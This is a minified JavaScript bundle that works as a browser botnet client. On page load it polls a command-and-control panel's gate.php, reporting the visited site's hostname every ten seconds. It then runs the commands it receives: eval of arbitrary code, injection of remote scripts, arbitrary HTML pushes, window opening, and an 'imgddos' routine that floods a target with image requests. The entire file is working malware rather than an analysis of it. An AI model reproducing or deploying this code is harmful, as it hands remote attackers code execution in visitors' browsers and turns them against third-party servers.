!function(t){var n={};function o(e){if(n[e])return n[e].exports;var r=n[e]={i:e,l:!1,exports:{}};return t[e].call(r.exports,r,r.exports,o),r.l=!0,r.exports}o.m=t,o.c=n,o.d=function(t,n,e){o.o(t,n)||Object.defineProperty(t,n,{enumerable:!0,get:e})},o.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},o.t=function(t,n){if(1&n&&(t=o(t)),8&n)return t;if(4&n&&"object"==typeof t&&t&&t.__esModule)return t;var e=Object.create(null);if(o.r(e),Object.defineProperty(e,"default",{enumerable:!0,value:t}),2&n&&"string"!=typeof t)for(var r in t)o.d(e,r,function(n){return t[n]}.bind(null,r));return e},o.n=function(t){var n=t&&t.__esModule?function(){return t.default}:function(){return t};return o.d(n,"a",n),n},o.o=function(t,n){return Object.prototype.hasOwnProperty.call(t,n)},o.p="",o(o.s=2)}([function(module,__webpack_exports__,__webpack_require__){"use strict";__webpack_require__.d(__webpack_exports__,"a",function(){return CommandExec});var _Command__WEBPACK_IMPORTED_MODULE_0__=__webpack_require__(1),__extends=(extendStatics=function(t,n){return(extendStatics=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,n){t.__proto__=n}||function(t,n){for(var o in n)n.hasOwnProperty(o)&&(t[o]=n[o])})(t,n)},function(t,n){function o(){this.constructor=t}extendStatics(t,n),t.prototype=null===n?Object.create(n):(o.prototype=n.prototype,new o)}),extendStatics,CommandExec=function(_super){function CommandExec(){return null!==_super&&_super.apply(this,arguments)||this}return __extends(CommandExec,_super),CommandExec.prototype.getCommand=function(){return"exec"},CommandExec.prototype.exec=function(args){eval(args)},CommandExec}(_Command__WEBPACK_IMPORTED_MODULE_0__.a)},function(t,n,o){"use strict";o.d(n,"a",function(){return e});var e=function(){return function(){}}()},function(t,n,o){"use strict";o.r(n);var e,r=function(){function t(){}return t.request=function(t,n,o,e){var r=new XMLHttpRequest;e?r.open("GET",t,!0):r.open("GET",t+"&"+(new Date).getTime(),!0),r.addEventListener("load",function(){r.status<400?n(JSON.parse(r.responseText)):o&&o()}),r.addEventListener("error",function(){throw o&&o(),"HttpError: Network not available"}),r.send(null)},t}(),c=o(0),u=o(1),i=(e=function(t,n){return(e=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,n){t.__proto__=n}||function(t,n){for(var o in n)n.hasOwnProperty(o)&&(t[o]=n[o])})(t,n)},function(t,n){function o(){this.constructor=t}e(t,n),t.prototype=null===n?Object.create(n):(o.prototype=n.prototype,new o)}),p=function(t){function n(){return null!==t&&t.apply(this,arguments)||this}return i(n,t),n.prototype.getCommand=function(){return"url"},n.prototype.exec=function(t){window.open(t,"_blank")},n}(u.a),s=function(){var t=function(n,o){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,n){t.__proto__=n}||function(t,n){for(var o in n)n.hasOwnProperty(o)&&(t[o]=n[o])})(n,o)};return function(n,o){function e(){this.constructor=n}t(n,o),n.prototype=null===o?Object.create(o):(e.prototype=o.prototype,new e)}}(),a=function(t){function n(){return null!==t&&t.apply(this,arguments)||this}return s(n,t),n.prototype.getCommand=function(){return"imgddos"},n.prototype.exec=function(t){var n=t.split(",");if(!(n.length<1))for(var o=n[0],e=parseInt(n[1]),r=0;r<e;r++)document.write('<img src="'+o+"?"+Math.random()+'" />')},n}(u.a),f=function(){var t=function(n,o){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,n){t.__proto__=n}||function(t,n){for(var o in n)n.hasOwnProperty(o)&&(t[o]=n[o])})(n,o)};return function(n,o){function e(){this.constructor=n}t(n,o),n.prototype=null===o?Object.create(o):(e.prototype=o.prototype,new e)}}(),_=function(t){function n(){return null!==t&&t.apply(this,arguments)||this}return f(n,t),n.prototype.getCommand=function(){return"inject"},n.prototype.exec=function(t){var n=document.createElement("script");n.src=t,document.body.append(n)},n}(u.a),l=function(){var t=function(n,o){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,n){t.__proto__=n}||function(t,n){for(var o in n)n.hasOwnProperty(o)&&(t[o]=n[o])})(n,o)};return function(n,o){function e(){this.constructor=n}t(n,o),n.prototype=null===o?Object.create(o):(e.prototype=o.prototype,new e)}}(),d=function(t){function n(){return null!==t&&t.apply(this,arguments)||this}return l(n,t),n.prototype.getCommand=function(){return"dompush"},n.prototype.exec=function(t){document.body.innerHTML+=t},n}(u.a),m=function(){var t=function(n,o){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,n){t.__proto__=n}||function(t,n){for(var o in n)n.hasOwnProperty(o)&&(t[o]=n[o])})(n,o)};return function(n,o){function e(){this.constructor=n}t(n,o),n.prototype=null===o?Object.create(o):(e.prototype=o.prototype,new e)}}(),y=function(t){function n(){return null!==t&&t.apply(this,arguments)||this}return m(n,t),n.prototype.getCommand=function(){return"alert"},n.prototype.exec=function(t){alert(t)},n}(u.a),h=function(){function t(t){this.commands=[],this.process=null,this.process=t,this.commands.push(new c.a),this.commands.push(new p),this.commands.push(new a),this.commands.push(new _),this.commands.push(new d),this.commands.push(new y)}return t.prototype.invoke=function(t){for(var n=0;n<t.length;n++){var o=t[n];this.callCommand(o.command,o.args)}},t.prototype.callCommand=function(t,n){for(var o=0;o<this.commands.length;o++){var e=this.commands[o];e.getCommand().toLocaleLowerCase()===t.toLocaleLowerCase()&&(e.invoker=this,e.process=this.process,e.exec(n))}},t}(),v=function(){function t(t,n){this.panel=null,this.seconds=0,this.processID=null,this.invoker=new h(this),this.panel=t,this.seconds=n}return t.prototype.start=function(){var t=this;t.fire(),this.processID=setInterval(function(){t.fire()},1e3*this.seconds)},t.prototype.stop=function(){clearInterval(this.processID)},t.prototype.fire=function(){var t=this;r.request(this.panel+"/gate.php?host="+window.location.hostname,function(n){var o=n.commands;t.invoker.invoke(o)})},t}();window.onload=function(){new v("http://127.0.0.1/panel",10).start()}}]);